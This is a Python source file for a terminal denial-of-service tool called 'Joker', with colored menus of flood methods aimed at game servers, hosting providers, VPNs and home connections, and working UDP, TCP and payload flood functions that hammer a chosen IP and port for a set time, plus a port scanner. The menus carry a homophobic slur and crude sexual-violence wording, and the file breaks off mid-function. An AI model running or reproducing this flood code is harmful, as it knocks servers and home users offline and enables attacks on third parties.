#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import subprocess
import socket
import time
import random
import threading
import getpass
import os
termssssss = """
\033[1;35m                       ╔═══════════════════════\033[1;32m═══════════════════════════╗
\033[1;35m                       ║ NO ATTACKING GOVERMENT\033[1;32m IPS / WEBSITES!           ║
\033[1;35m                       ║ NO ABUSING ATTACK TIME\033[1;32m / POWER / SPAMMING!       ║
\033[1;35m                       ║ NO SHARING YOUR LOGIN \033[1;32mCREDENTIALS!               ║
\033[1;35m                       ║ NO ATTACKING PUBLIC DS\033[1;32mTATS!                      ║
\033[1;35m                       ║ NO Attacking Luna Net!\033[1;32m                           ║
\033[1;35m                       ║ NO SHARING NET INFO! \033[1;32m                            ║
\033[1;35m                       ╚═══╦══════════════════\033[1;32m══════════════════════╦═════╝
\033[1;35m                          ╔╩══════════════════\033[1;32m══════════════════════╩╗
\033[1;35m                          ║ No Owners Will Tak\033[1;32me Responibility Of You ║
\033[1;35m                          ╚══════════╦════════\033[1;32m════════════╦══════════╝
\033[1;35m                                     ║   Type \033[1;32m'yes' fag   ║
\033[1;35m                                     ╚════════\033[1;32m════════════╝
"""
banner = """\033[1;35m        
    \033[1;35m                                 ╦╔═╗╦╔═\033[1;32m╔═╗╦═╗
    \033[1;35m                                 ║║ ║╠╩╗\033[1;32m║╣ ╠╦╝
    \033[1;35m                                ╚╝╚═╝╩ ╩\033[1;32m╚═╝╩╚═
    \033[1;35m                            🤡 \033[1;32mWe are all clowns \033[1;35m🤡
"""
methods = """                      
            \033[1;35m╔════════════════════════╗
            \033[1;35m║ \033[1;32m---- Methods List! --- \033[1;35m╚═════════╗
            \033[1;35m║ \033[1;32mGEN3   > Shows GEN3 Methods!\033[1;35m     ║
            \033[1;35m║ \033[1;32mLAYER4 > Shows LAYER 4 Methods!\033[1;35m  ║
            \033[1;35m║ \033[1;32mPRIVATE> Shows PRIVATE Methods!\033[1;35m  ║
            \033[1;35m║ \033[1;32mRAW    > Shows RAW Methods!\033[1;35m      ║
            \033[1;35m║ \033[1;32mMORE   > Shows MORE Methods!\033[1;35m     ║
            \033[1;35m╠══════════════════════════════════╝                      
"""
more = """
            \033[1;35m                                 ╦╔═╗╦╔═\033[1;32m╔═╗╦═╗
            \033[1;35m                                 ║║ ║╠╩╗\033[1;32m║╣ ╠╦╝
            \033[1;35m                                ╚╝╚═╝╩ ╩\033[1;32m╚═╝╩╚═
            \033[1;35m                            🤡 \033[1;32mWe are all clowns \033[1;35m🤡
            \033[1;35m
            \033[1;35m             ╔═════════════════════════╗═════════════════════════╗
            \033[1;35m             ║   \033[1;32mnfo-down .  ovh-down  \033[1;35m║   \033[1;32movh-crush .  dedipath \033[1;35m║
            \033[1;35m             ║   \033[1;32mgame-nfo .  ovh-game  \033[1;35m║   \033[1;32mfivem-nfo .  serverv2 \033[1;35m║
            \033[1;35m             ╚╗════════════════════════╝════════════════════════╔╝
            \033[1;35m              ║  \033[1;32msy-killall   .  sy-killallv2  .  sy-killallv3  \033[1;35m║
            \033[1;35m              ║  \033[1;32mcaptcha-down .  2k-21         .  ddos-guard    \033[1;35m║
            \033[1;35m              ║  \033[1;32mark-destroy  .  tcp-down      .  udp-downv2    \033[1;35m║
            \033[1;35m              ║  \033[1;32mudp-down     .  sy-killallv4   .  server       \033[1;35m║
            \033[1;35m              ║  \033[1;32mvpn-down     .  od-down       .  redsyn        \033[1;35m║
            \033[1;35m              ║  \033[1;32mnfo-mob      .  aws-destroy   .  sos           \033[1;35m║
            \033[1;35m             ╔╝  \033[1;32m wra         .     odin     .   dns       .    sos   \033[1;35m║
            \033[1;35m             ║══════════════════════════════════════════════════╚╗
            \033[1;35m             ║═══════════════════════════════════════════════════║
            \033[1;35m             ║        \033[1;32mapisend [METHOD [IP] [TIME] [PORT]         \033[1;35m║
            \033[1;35m             ╚═══════════════════════════════════════════════════╝
            
"""
raw = """
            \033[1;35m                                 ╦╔═╗╦╔═\033[1;32m╔═╗╦═╗
            \033[1;35m                                 ║║ ║╠╩╗\033[1;32m║╣ ╠╦╝
            \033[1;35m                                ╚╝╚═╝╩ ╩\033[1;32m╚═╝╩╚═
            \033[1;35m                            🤡 \033[1;32mWe are all clowns \033[1;35m🤡
            \033[1;35m
            \033[1;35m            ╔══════════════════════════╦════════════════════════════╗
            \033[1;35m            ║ \033[1;32mudpRAW - RAW UDP Flood   \033[1;35m║ \033[1;32mhexRAW - RAW HEX Flood     \033[1;35m║
            \033[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
            \033[1;35m             ║ \033[1;32mtcpRAW - RAW TCP Flood \033[1;35m║ ║ \033[1;32mvseRAW - RAW VSE Flood   \033[1;35m║
            \033[1;35m             ║ \033[1;32mstdRAW - RAW STD Flood \033[1;35m║ ║ \033[1;32msynRAW - RAW SYN Flood   \033[1;35m║
            \033[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
            \033[1;35m            ║    \033[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \033[1;35m║
            \033[1;35m            ╚═══════════════════════════════════════════════════════╝
"""
gen3 = """
            \033[1;35m                                 ╦╔═╗╦╔═\033[1;32m╔═╗╦═╗
            \033[1;35m                                 ║║ ║╠╩╗\033[1;32m║╣ ╠╦╝
            \033[1;35m                                ╚╝╚═╝╩ ╩\033[1;32m╚═╝╩╚═
            \033[1;35m                            🤡 \033[1;32mWe are all clowns \033[1;35m🤡
            \033[1;35m
            \033[1;35m            ╔══════════════════════════╦════════════════════════════╗
            \033[1;35m            ║ \033[1;32movhslav - Slavic Flood   \033[1;35m║ \033[1;32miotv1 - Custom Method!     \033[1;35m║
            \033[1;35m            ║ \033[1;32mcpukill - Cpu Rape Flood \033[1;35m║ \033[1;32miotv2 - Custom Method!     \033[1;35m║
            \033[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
            \033[1;35m             ║ \033[1;32mfivemkill - Fivem Kill \033[1;35m║ ║ \033[1;32miotv3 - Custom Method!   \033[1;35m║
            \033[1;35m             ║ \033[1;32micmprape  - ICMP Rape  \033[1;35m║ ║ \033[1;32mssdp  - Amped SSDP       \033[1;35m║
            \033[1;35m             ║ \033[1;32mtcprape - Raping TCP   \033[1;35m║ ║ \033[1;32marknull - Ark Method     \033[1;35m║
            \033[1;35m             ║ \033[1;32mnforape - Nfo Method   \033[1;35m║ ║ \033[1;32m2kdown  - NBA 2K Flood   \033[1;35m║
            \033[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
            \033[1;35m            ║    \033[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \033[1;35m║
            \033[1;35m            ╚═══════════════════════════════════════════════════════╝       
"""
layer4 = """
            \033[1;35m                                 ╦╔═╗╦╔═\033[1;32m╔═╗╦═╗\033[37m
            \033[1;35m                                 ║║ ║╠╩╗\033[1;32m║╣ ╠╦╝\033[37m
            \033[1;35m                                ╚╝╚═╝╩ ╩\033[1;32m╚═╝╩╚═\033[37m
            \033[1;35m                            🤡 \033[1;32mWe are all clowns\033[1;35m 🤡\033[37m
            \033[38m
            \033[1;35m            ╔══════════════════════════╦════════════════════════════╗\033[37m
            \033[1;35m            ║  \033[1;32mudp [IP] [TIME] [PORT]  \033[1;35m║   \033[1;32mvse [IP] [TIME] [PORT]   \033[1;35m║\033[37m
            \033[1;35m            ║  \033[1;32mtcp [IP] [TIME] [PORT]  \033[1;35m║   \033[1;32mack [IP] [TIME] [PORT]   \033[1;35m║\033[37m
            \033[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\033[37m
            \033[1;35m             ║ \033[1;32mstd [IP] [TIME] [PORT] \033[1;35m║ ║ \033[1;32mdns [IP] [TIME] [PORT]   \033[1;35m║\033[37m
            \033[1;35m             ║ \033[1;32msyn [IP] [TIME] [PORT] \033[1;35m║ ║ \033[1;32movh [IP] [TIME] [PORT]   \033[1;35m║\033[37m
            \033[1;35m             ║ \033[1;32mice [IP] [TIME] [PORT] \033[1;35m║ ║ \033[1;32mice [IP] [TIME] [PORT]   \033[1;35m║\033[37m
            \033[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\033[37m
            \033[1;35m            ║    \033[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \033[1;35m║\033[37m
            \033[1;35m            ╚═══════════════════════════════════════════════════════╝\033[37m
"""
private = """
            \033[1;35m                                 ╦╔═╗╦╔═\033[1;32m╔═╗╦═╗ 
            \033[1;35m                                 ║║ ║╠╩╗\033[1;32m║╣ ╠╦╝ 
            \033[1;35m                                ╚╝╚═╝╩ ╩\033[1;32m╚═╝╩╚═\033[0m 
            \033[1;35m                            🤡 \033[1;32mWe are all clowns \033[1;35m🤡\033[0m 
            \033[1;35m\033[0m 
            \033[1;35m            ╔══════════════════════════╦════════════════════════════╗\033[0m 
            \033[1;35m            ║ \033[1;32mhomeslap    . r6kill     \033[1;35m║ \033[1;32mfivemtcp  . nfokill        \033[1;35m║\033[0m 
            \033[1;35m            ║ \033[1;32mark255      . arklift    \033[1;35m║ \033[1;32mhotspot   . vpn            \033[1;35m║\033[0m 
            \033[1;35m            ║ \033[1;32mhydrakiller . arkdown    \033[1;35m║ \033[1;32mnfonull   . dhcp           \033[1;35m║\033[0m 
            \033[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\033[0m 
            \033[1;35m             ║ \033[1;32movhnat    . ovhamp     \033[1;35m║ ║ \033[1;32movhwdz    . ovhx         \033[1;35m║\033[0m 
            \033[1;35m             ║ \033[1;32mnfodrop   . nfocrush   \033[1;35m║ ║ \033[1;32mnfodown   . nfox         \033[1;35m║\033[0m 
            \033[1;35m             ║ \033[1;32mudprape   . udprapev3  \033[1;35m║ ║ \033[1;32mfortnite  . fortnitev2   \033[1;35m║\033[0m 
            \033[1;35m             ║ \033[1;32mudprapev2 . udpbypass  \033[1;35m║ ║ \033[1;32mgreeth    . telnet       \033[1;35m║\033[0m 
            \033[1;35m             ║ \033[1;32mfivemv2   . r6drop     \033[1;35m║ ║ \033[1;32mr6freeze  . killall      \033[1;35m║\033[0m 
            \033[1;35m             ║ \033[1;32m2krape    . fallguys   \033[1;35m║ ║ \033[1;32movhdown   . ovhkill      \033[1;35m║\033[0m 
            \033[1;35m             ║ \033[1;32mvfivemrape . fivemdown \033[1;35m║ ║ \033[1;32mfivemv1   . fivemslump   \033[1;35m║\033[0m 
            \033[1;35m             ║ \033[1;32mkillallv2 . killallv3  \033[1;35m║ ║ \033[1;32mpowerslap . rapecom      \033[1;35m║\033[0m 
            \033[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\033[0m 
            \033[1;35m            ║    \033[1;32mExample How To Attack: .METHOD [IP] [TIME] [PORT]   \033[1;35m║\033[0m 
            \033[1;35m            ╚═══════════════════════════════════════════════════════╝\033[0m 
            """
info = """\033[36m                  
                        \033[1;35m Joker Was Made By \033[1;32m-\033[00m Escape                            
                        \033[1;35m Discord \033[1;32m- XeEscape#4337                             
                        \033[1;35m Instagram \033[1;32m- @trynescapemeh 
                        \033[1;35m most powerfull method is killallv4. 
                        \033[1;35m for method size use "65507" or if your vps is weak use 1024.       
"""
version = "XV"
help = """
            \033[1;35m                 ╔════════════════════════════════════════════╗\033[0m
            \033[1;35m                 ║ \033[1;32mUpdates \033[1;35m-\033[1;32m SHOWS NET ATTACK MENUS           \033[1;35m║\033[0m
            \033[1;35m                 ║ \033[1;32mMethods \033[1;35m-\033[1;32m SHOWS SPOOF API ATTACK METHODS   \033[1;35m║\033[0m
            \033[1;35m                 ║ \033[1;32mExit \033[1;35m-\033[1;32m CLOSE YOUR TERMINAL                 \033[1;35m║\033[0m
            \033[1;35m                 ║ \033[1;32mInfo \033[1;35m-\033[1;32m  my socials                         \033[1;35m║\033[0m
            \033[1;35m                 ║ \033[1;32mCLEAR \033[1;35m/\033[1;32m CLS - CLEARS YOUR TERMINAL         \033[1;35m║\033[0m
            \033[1;35m                 ╚════════════════════════════════════════════╝\033[0m          
"""
updatenotes = """
                    \033[1;35m║ Updated \033[1;32mBanners                                  
                    \033[1;35m║ Updated \033[1;32mColor Codes      
                    \033[1;35m║ Updated \033[1;32mAttack Methods                             
                    \033[1;35m║ Bug where attack \033[1;32mwont send fixed                                  
                    \033[1;35m║ Faster \033[1;32mAttack Sender                                
                    \033[1;35m║ Joker Updates i\033[1;32mn Luna Discord                             
                    \033[1;35m║ All Perl Script upgraded t\033[1;32mo recent update of joker (XV)
                    \033[1;35m║ Only methods out rn i\033[1;32ms .udp / .udpflood / .tcp / .home / .killall
                    \033[1;35m║ If You want updated Jo\033[1;32mker join my discord! https://discord.gg/RJT9EMXjVF                  
"""
cookie = open(".Jokerput","w+")
atks = 0
fsubs = 0
tpings = 0
pscans = 0
liips = 0
running = 0
attack = True
def udp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1
def udpflood(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1
def tcp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_TCP, 17)
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.sendto(bytes, (host, int(port)))
            sock.close()
        except socket.error:
            pass
            
    atks -= 1
    running -= 1
def fortniteudp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1
def fortnitemixudp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1
def fortnitemixicmp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1
def icmp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1
def mixudp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1    
def mixicmp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1
def homeudp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1    
def homeicmp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
def homeudpivp6(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1    
def homeicmpivp6(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET6, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1
def killalludp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1
def killallicmp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
def killallvse(host, port, timer, payload):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1
def vse(host, port, timer, payload):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1
def hex(host, port, timer, payload):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1
def run(cmd):
    subprocess.call(cmd, shell=True)
def main():
    global attack
    global tpings
    global fsubs
    global liips
    global running
    global attack
    global tcp
    global icmp
    global pscans
    while True:
        sys.stdout.write("\033]2;| Joker Made By Escape | User: {}".format(users))
        Joker = input("\033                   \033[1;35mJoker\033[1;32m⮞\033[00m".format(users).lower())
        print("")
        Jokerput = Joker.split(" ")[0]
        if Jokerput == "clear":
            os.system(clear)
            print(banner)
            main()
        if Jokerput == "cls":
            os.system(clear)
            print(banner)
            main()
        if Jokerput == "?":
            os.system(clear)
            print(banner)
            print (help)
            main()
        if Jokerput == "help":
            os.system(clear)
            print(banner)
            print (help)
            main()
        if Jokerput == "private":
            os.system(clear)
            print (private)
            main()
        if Jokerput == "gen3":
            os.system(clear)
            print (gen3)
            main()
        if Jokerput == "raw":
            os.system(clear)
            print (raw)
            main()
        if Jokerput == "layer4":
            os.system(clear)
            print (layer4)
            main()
        if Jokerput == "more":
            os.system(clear)
            print (more)
            main()
        if Jokerput == "exit":
            os.system(clear)
            print(banner)
            print ("\033[36m           Contact Me on instagram if you have any problems @trynescapemeh")
            on_enter = input("\033[36m                  Please press enter to leave")
            print ("\033[00m")
            os.system(clear)
            exit()
        if Jokerput == "version":
            print ("                  \033[1;35mJoker Version\033[1;32m: "+version+" ")
            main()
        if Jokerput == "methods":
            os.system(clear)
            print(banner)
            print (methods)
            main()
        if Jokerput == "dstat":
            run("dstat")
            main()
        if Jokerput == "tools":
            os.system(clear)
            print(banner)
            print (tools)
            main()
        if Jokerput == "nmap":
            try:
                Jokerput, host = Joker.split(" ")
                os.system(clear)
                print("[\033[36mJoker\033[00m] scanning... {} use CRTL + C to close".format (host))
                time.sleep(1)
                run("nmap -T4 -F {}".format (host))
                time.sleep(1000)
            except ValueError:
                print("                  [\033[36mJoker\033[00m]\033[91m the command {} requires an argument".format (Jokerput))
                main()
            except KeyboardInterrupt:
                print ("\n[\033[36mJoker\033[00m]\033[91m closed nmap")
                time.sleep(1)
                os.system(clear)
                print(banner)
                main()
        if Jokerput == "portscan":
            port_range = int(Joker.split(" ")[2])
            pscans += 1
            def scan(port, ip):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((ip, port))
                    print ("                  [\033[36mJoker\033[00m] {}\033[36m:\033[00m{} [\033[36mOPEN\033[00m]".format (ip, port))
                    sock.close()
                except socket.error:
                    return
                except KeyboardInterrupt:
                    print ("\n                  [\033[36mJoker\033[00m] stoped portscan")
                    main()
            for port in range(1, port_range+1):
                ip = socket.gethostbyname(Joker.split(" ")[1])
                threading.Thread(target=scan, args=(port, ip)).start()
            main()
        if Jokerput == "iplookup":
            try:
                Jokerput, host = Joker.split(" ")
                os.system(clear)
                print("[\033[36mJoker\033[00m] looking up info about: {} use CRTL + C to close".format (host))
                time.sleep(1)
                run("curl https://ipinfo.io/{}/json".format (host))
                time.sleep(1000)
            except ValueError:
                print("                  [\033[36mJoker\033[00m]\033[91m the command {} requires an argument".format (Jokerput))
                main()
            except KeyboardInterrupt:
                print ("\n[\033[36mJoker\033[00m]\033[91m closed iplookup")
                time.sleep(1)
                os.system(clear)
                print(banner)
                main()
        if Jokerput == "updates":
            os.system(clear)
            print(banner)
            print (updatenotes)
            main()
        if Jokerput == "info":
            os.system(clear)
            print(banner)
            print (info)
            main()
        if Jokerput == "attacks":
            print ("                  [\033[36mJoker\033[00m] Total attacks running: {}\n".format (atks))
            main()
        if Jokerput == "resolve":
            liips += 1
            host = Joker.split(" ")[1]
            host_ip = socket.gethostbyname(host)
            print ("                  [\033[36mJoker\033[00m] Host: {} \033[00m[\033[36mConverted\033[00m] {}".format (host, host_ip))
            main()
        if Jokerput == "ping":
            tpings += 1
            try:
                Jokerput, host, port = Joker.split(" ")
                print ("                  [\033[36mJoker\033[00m] Starting ping on host: {}".format (host))
                try:
                    ip = socket.gethostbyname(host)
                except socket.gaierror:
                    print (                  "[\033[36mJoker\033[00m]\033[91m Host un-resolvable")
                    main()
                while True:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        start = time.time() * 1000
                        sock.connect ((host, int(port)))
                        stop = int(time.time() * 1000 - start)
                        sys.stdout.write("\033]2;Joker |{}ms|\x07".format (stop))
                        print ("                  Joker: {}:{} | Time: {}ms [\033[36mUP\033[00m]".format(ip, port, stop))
                        sock.close()
                        time.sleep(1)
                    except socket.error:
                        sys.stdout.write("\033]2;Joker |TIME OUT|\x07")
                        print ("                  Joker: {}:{} [\033[36mDOWN\033[00m]".format(ip, port))
                        time.sleep(1)
                    except KeyboardInterrupt:
                        print ("\n                  [\033[36mJoker\033[00m]\033[91m stoped ping")
                        main()
            except ValueError:
                print ("                  [\033[36mJoker\033[00m]\033[91m The command {} requires an argument".format (Jokerput))
                main()
        elif Jokerput == ".udpplain":
            try:
                Jokerput, host, port, timer, size = Joker.split(" ")
                socket.gethostbyname(host)
                print("                  [\033[36mJoker\033[00m] attack sent to: {}".format (host))
                bytes = random._urandom(int(size))
                threading.Thread(target=udp, args=(host, port, timer, bytes)).start()
            except ValueError:
                print("                  [\033[36mJoker\033[00m]\033[91m the command {} requires an argument".format (Jokerput))
                main()
            except socket.gaierror:
                print("                  [\033[36mJoker\033[00m]\033[91m host: {} invalid".format (host))
                main()
        elif Jokerput == ".udpflood":
            try:
                Jokerput, host, port, timer, size = Joker.split(" ")
                socket.gethostbyname(host)
                print("                  [\033[36mJoker\033[00m] attack sent to: {}".format (host))
                bytes = random._urandom(int(size))
                threading.Thread(target=udpflood, args=(host, port, timer, bytes)).start()
            except ValueError:
                print("                  [\033[36mJoker\033[00m]\033[91m the command {} requires an argument".format (Jokerput))
                main()
            except socket.gaierror:
                print("                  [\033[36mJoker\033[00m]\033[91m host: {} invalid".format (host))
                main()
        elif Jokerput == ".tcp":
            try:
                Jokerput, host, port, timer, size = Joker.split(" ")
                socket.gethostbyname(host)
                print("                  [\033[36mJoker\033[00m] attack sent to: {}".format (host))
                bytes = random._urandom(int(size))
                threading.Thread(target=tcp, args=(host, port, timer, bytes)).start()
            except ValueError:
                print("                  [\033[36mJoker\033[00m]\033[91m the command {} requires an argument".format (Jokerput))
                main()
            except socket.gaierror:
                print("                  [\033[36mJoker\033[00m]\033[91m host: {} invalid".format (host))
                main()
        elif Jokerput == ".home":
            try:
                Jokerput, host, port, timer, size = Joker.split(" ")
                socket.gethostbyname(host)
                print("                  [\033[36mJoker\033[00m] attack sent to: {}".format (host))
                bytes = random._urandom(int(size))
                threading.Thread(target=homeudp, args=(host, port, timer, bytes)).start()
                threading.Thread(target=homeicmp, args=(host, port, timer, bytes)).start()
            except ValueError:
                print("                  [\033[36mJoker\033[00m]\033[91m the command {} requires an argument".format (Jokerput))
                main()
            except socket.gaierror:
                print("                  [\033[36mJoker\033[00m]\033[91m host: {} invalid".format (host))
                main()
        elif Jokerput == ".killall":
            try:
                Jokerput, host, port, timer, size = Joker.split(" ")
                socket.gethostbyname(host)
                print("                  [\033[36mJoker\033[00m] attack sent to: {}".format (host))
                payload = b"\xff\xff\xff\xff\x00"
                bytes = random._urandom(int(size))
